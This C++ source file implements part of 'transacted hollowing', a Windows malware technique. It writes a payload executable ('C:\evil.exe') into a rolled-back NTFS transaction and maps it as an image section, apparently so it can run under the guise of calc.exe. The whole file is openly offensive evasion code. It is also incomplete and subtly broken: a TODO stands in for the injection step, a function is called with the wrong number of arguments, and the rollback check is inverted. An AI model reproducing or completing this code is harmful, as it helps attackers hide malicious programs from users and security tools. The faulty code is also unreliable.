/*
Title: Transacted Hollowing
Resources:
	- https://github.com/hasherezade/transacted_hollowing
Status: This technique no longer works on Windows 11. The error (0xc0000005) occurs when invoking the NtCreateSection function.
*/
#include <Windows.h>
#include <ktmw32.h>
#include <stdio.h>
#include <string>
#include "TransactedHollowing.hpp"
#pragma comment(lib, "ktmw32.lib")

_NtCreateSection ntCreateSection = nullptr;

VOID FreeAll(HMODULE hNtdll, BYTE* payloadBuf, HANDLE hSection) {
	if (hNtdll)
		FreeLibrary(hNtdll);
	if (payloadBuf)
		VirtualFree(payloadBuf, 0, MEM_RELEASE);
	if (hSection)
		CloseHandle(hSection);
}

BOOL InitFunctions(HMODULE hNtdll) {
	ntCreateSection = reinterpret_cast<_NtCreateSection>(GetProcAddress(hNtdll, "NtCreateSection"));
	if (!ntCreateSection) return FALSE;

	return TRUE;
}

BYTE* MapPayload(const std::wstring& wPayloadPath, DWORD* dwPayloadSize) {
	HANDLE hPayloadFile = CreateFile(
		wPayloadPath.c_str(),
		GENERIC_READ,
		FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
	);
	if (!hPayloadFile) return nullptr;

	*dwPayloadSize = GetFileSize(hPayloadFile, nullptr);

	// Map the payload
	HANDLE hMapping = CreateFileMapping(hPayloadFile, 0, PAGE_READONLY, 0, 0, 0);
	if (!hMapping) {
		CloseHandle(hPayloadFile);
		return nullptr;
	}
	BYTE* rawData = (BYTE*)MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
	if (!rawData) {
		CloseHandle(hMapping);
		CloseHandle(hPayloadFile);
		return nullptr;
	}
	BYTE* payloadBuf = (BYTE*)VirtualAlloc(nullptr, *dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!payloadBuf) {
		CloseHandle(hMapping);
		CloseHandle(hPayloadFile);
		return nullptr;
	}
	memcpy(payloadBuf, rawData, *dwPayloadSize);

	UnmapViewOfFile(rawData);
	CloseHandle(hMapping);
	CloseHandle(hPayloadFile);

	return payloadBuf;
}

HANDLE MakeTransactedSection(BYTE* payloadBuf, DWORD dwPayloadSize) {
	DWORD dwOptions = 0;
	DWORD dwIsolationLevel = 0;
	DWORD dwIsolationFlags = 0;
	DWORD dwTimeout = 0;

	HANDLE hTx = CreateTransaction(
		nullptr,
		nullptr,
		dwOptions,
		dwIsolationLevel,
		dwIsolationFlags,
		dwTimeout,
		nullptr
	);
	if (!hTx || hTx == INVALID_HANDLE_VALUE) {
		return nullptr;
	}

	WCHAR wTempDir[MAX_PATH] = { 0 };
	WCHAR wTempFullPath[MAX_PATH] = { 0 };
	DWORD dwTempLength = GetTempPathW(MAX_PATH, wTempDir);
	GetTempFileNameW(wTempDir, L"TH", 0, wTempFullPath);

	HANDLE hTxFile = CreateFileTransactedW(
		wTempFullPath,
		GENERIC_WRITE | GENERIC_READ,
		0,
		nullptr,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		nullptr,
		hTx,
		nullptr,
		nullptr
	);
	if (!hTxFile || hTxFile == INVALID_HANDLE_VALUE) {
		CloseHandle(hTx);
		return nullptr;
	}

	// Write the payload to the transacted file.
	DWORD dwWritten = 0;
	if (!WriteFile(hTxFile, payloadBuf, dwPayloadSize, &dwWritten, nullptr)) {
		CloseHandle(hTxFile);
		CloseHandle(hTx);
		return nullptr;
	}

	HANDLE hSection = nullptr;
	// WARNING: This may no longer work on Windows 11...
	NTSTATUS status = ntCreateSection(
		&hSection,
		SECTION_ALL_ACCESS,
		nullptr,
		0,
		PAGE_READONLY,
		SEC_IMAGE,
		hTxFile
	);
	if (!NT_SUCCESS(status)) {
		printf("status: 0x%x\n", status);
		CloseHandle(hTxFile);
		CloseHandle(hTx);
		return nullptr;
	}

	CloseHandle(hTxFile);
	hTxFile = nullptr;

	// Rollback the transaction.
	if (RollbackTransaction(hTx)) {
		CloseHandle(hTx);
		return nullptr;
	}

	CloseHandle(hTx);
	return hSection;
}

BOOL TransactedHollowing() {
	std::wstring wPayloadPath = L"C:\\evil.exe";
	std::wstring wTargetPath = L"C:\\Windows\\System32\\calc.exe";

	HMODULE hNtdll = LoadLibraryA("ntdll.dll");
	if (!hNtdll) return FALSE;
	if (!InitFunctions(hNtdll)) return FALSE;

	DWORD dwPayloadSize = 0;
	BYTE* payloadBuf = MapPayload(wPayloadPath, &dwPayloadSize);
	if (!payloadBuf) return FALSE;
	
	HANDLE hSection = MakeTransactedSection(payloadBuf, dwPayloadSize);
	if (!hSection) return FALSE;

	// TODO: Implement the remaining code.

	FreeAll(payloadBuf, hSection);

	return TRUE;
}
